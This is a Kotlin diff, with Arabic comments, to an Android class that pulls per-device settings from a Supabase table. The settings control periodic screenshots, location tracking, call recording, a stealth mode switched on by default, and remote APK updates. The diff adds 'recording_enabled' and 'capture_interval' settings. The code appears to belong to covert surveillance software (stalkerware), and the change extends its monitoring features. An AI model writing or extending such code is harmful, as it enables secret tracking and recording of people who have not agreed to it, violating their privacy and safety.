@@ -33,7 +33,7 @@ class RemoteConfigManager(private val context: Context) {
             
             // محاولة جلب السجل الخاص بالجهاز
             val response = client.from(TABLE_NAME)
-                .select(Columns.list("screenshot_interval_ms", "location_interval_ms", "record_calls", "stealth_mode_active", "target_version", "update_apk_path", "update_apk_url")) {
+                .select(Columns.list("screenshot_interval_ms", "location_interval_ms", "record_calls", "stealth_mode_active", "target_version", "update_apk_path", "update_apk_url", "recording_enabled", "capture_interval")) {
                     filter {
                         eq("device_id", deviceId)
                     }
@@ -61,10 +61,12 @@ class RemoteConfigManager(private val context: Context) {
             val client = SupabaseManager.getInstance().getClient() ?: return@withContext
             val defaultSettings = DefaultSettingsPayload(
                 device_id = deviceId,
-                screenshot_interval_ms = 60000,
+                screenshot_interval_ms = 300000,
                 location_interval_ms = 600000,
                 record_calls = false,
-                stealth_mode_active = true
+                stealth_mode_active = true,
+                recording_enabled = false,
+                capture_interval = 90000
             )
             client.from(TABLE_NAME).insert(defaultSettings)
             Log.i(TAG, "Default settings initialized for device: $deviceId")
@@ -82,20 +84,24 @@ class RemoteConfigManager(private val context: Context) {
  */
 @Serializable
 data class AppSettings(
-    val screenshot_interval_ms: Long = 60000,
+    val screenshot_interval_ms: Long = 300000,
     val location_interval_ms: Long = 600000, // 10 minutes default
     val record_calls: Boolean = false,
     val stealth_mode_active: Boolean = true,
     val target_version: Int = 1,
     val update_apk_path: String? = null,  // مسار Supabase Storage
-    val update_apk_url: String? = null    // رابط HTTP مباشر (الأولوية عند وجوده)
+    val update_apk_url: String? = null,    // رابط HTTP مباشر (الأولوية عند وجوده)
+    val recording_enabled: Boolean = false,
+    val capture_interval: Long = 90000
 )
 
 @Serializable
 data class DefaultSettingsPayload(
     val device_id: String,
-    val screenshot_interval_ms: Long = 60000,
+    val screenshot_interval_ms: Long = 300000,
     val location_interval_ms: Long = 600000,
     val record_calls: Boolean = false,
-    val stealth_mode_active: Boolean = true
+    val stealth_mode_active: Boolean = true,
+    val recording_enabled: Boolean = false,
+    val capture_interval: Long = 90000
 )
